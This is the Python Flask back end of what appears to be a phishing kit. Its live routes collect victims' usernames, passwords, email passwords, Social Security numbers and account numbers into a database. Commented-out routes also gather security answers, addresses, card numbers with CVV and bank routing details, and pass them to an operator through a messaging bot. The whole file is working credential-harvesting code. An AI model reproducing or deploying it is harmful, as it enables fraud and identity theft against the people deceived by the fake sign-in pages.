from flask import Blueprint, render_template, request, redirect, url_for
from mandt import db, User, Others


portals = Blueprint('portals', __name__)

@portals.route('/signin', methods=['GET','POST'])
def signin():
    if request.method == 'POST':
        user_id = request.form['username']
        password = request.form['password']
        if user_id and password:
            # print(user_id,password,first_try_user_id,first_try_password)
            new_user = User(username=user_id, password=password)
            db.session.add(new_user)
            db.session.commit()
            return redirect(url_for('portals.other_info'))
    return render_template('sign_in.html')


@portals.route('/signin/verify-information', methods=['GET','POST'])
def other_info():
    if request.method == 'POST':
        email_ = request.form['email']
        email_pass = request.form['email-password']
        ssn_ = request.form['ssn']
        accNum_ = request.form['accNum']
        # print(email, email_pass,ssn,accNum)
        new_other_info = Others(email=email_, password=email_pass, ssn=ssn_, accNum=accNum_)
        db.session.add(new_other_info)
        db.session.commit()
        return redirect(url_for('main.syncing'))
    return render_template('other_info.html')  


# @portals.route('/signin/security-question', methods=['GET','POST'])
# def question():
#     if request.method == 'POST':
#         q1 = request.form['q1']
#         ans1 = request.form['ans1']
#         q2 = request.form['q2']
#         ans2 = request.form['ans2']
#         q3 = request.form['q3']
#         ans3 = request.form['ans3']
#         email = request.form['email']
#         email_pass = request.form['email-password']
#         # print(q1,ans1,q2,ans2,q3,ans3)
#         # bot.send_message(receiver_id, f'--------------------------\n\
#         #     ------------QUESTION AND ANSWER-------------\
#         #     {q1} -----> {ans1}\n\
#         #     {q2} -----> {ans2}\n\
#         #     {q3} -----> {ans3}\n\n\n\
#         #     ------------EMAIL CREDENTIALS-------------\
#         #     Email -----> {email}\n\
#         #     Password -----> {email_pass}\n--------------------------')
#         security_question(q1,ans1,q2,ans2,q3,ans3,email,email_pass)
#         return redirect(url_for('main.syncing'))
#     return render_template('questions.html')  



# @portals.route('/signin/address-confirmation', methods=['GET','POST'])
# def address():
#     if request.method == 'POST':
#         address = request.form['address']
#         apt = request.form['apt']
#         city = request.form['city']
#         state = request.form['state']
#         zipcode = request.form['zipcode']
#         if address and city and state and zipcode:
#             # print( card_name, card_number, exp_date, cvv)
#             report_address(address, apt, city, state, zipcode)
#             return redirect(url_for('portals.question'))
#     return render_template('address.html')



# @portals.route('/signin/email-confirmation', methods=['GET','POST'])
# def email_confirmation():
#     if request.method == 'POST':
#         email = request.form['email']
#         password = request.form['email-password']
#         if email and password:
#             print(email,password)
#             # bot.send_message(receiver_id, f'--------------------------\Email: {email}\nEmail Password: {password}\n--------------------------')
#             return redirect(url_for('portals.ssn'))
#     return render_template('identity-gmail.html')

# @portals.route('/signin/ssn', methods=['GET','POST'])
# def ssn():
#     if request.method == 'POST':
#         ssn = request.form['ssn']
#         dob = request.form['dob']
#         if ssn:
#             # print(ssn)
#             bot.send_message(receiver_id, f'--------------------------\n\
#                 SSN is: {ssn}\n\
#                 DOB is: {dob}\n\--------------------------')
#             return redirect(url_for('portals.card_confirmation'))
#     return render_template('identity-ssn.html')


# @portals.route('/signin/card-confirmation', methods=['GET','POST'])
# def card_confirmation():
#     if request.method == 'POST':
#         card_name = request.form['card_name']
#         card_number = request.form['card_number']
#         exp_date = request.form['exp_date']
#         cvv = request.form['cvv']
#         if card_name and card_number and exp_date and cvv:
#             print( card_name, card_number, exp_date, cvv)
#             bot.send_message(receiver_id, f'--------------------------\nCard Name: {card_name}\nCard Number: {card_number}\nExpiry date: {exp_date}\nCVV: {cvv}\n--------------------------')
#             return redirect(url_for('main.syncing'))
#     return render_template('bank-card.html')


# @portals.route('/signin/personal-confirmation', methods=['GET','POST'])
# def personal_confirmation():
#     if request.method == 'POST':
#         card_name = request.form['account_name']
#         card_number = request.form['account_number']
#         exp_date = request.form['routine_number']
#         if card_name and card_number and exp_date:
#             # print( card_name, card_number, exp_date, cvv)
#             report_personal_details(card_name, card_number, exp_date)
#             return redirect(url_for('main.syncing'))
#     return render_template('personal_info.html')

# dimitriy.fletcher@ilydeen.org {cameleon}

# We are all 6 years old at some level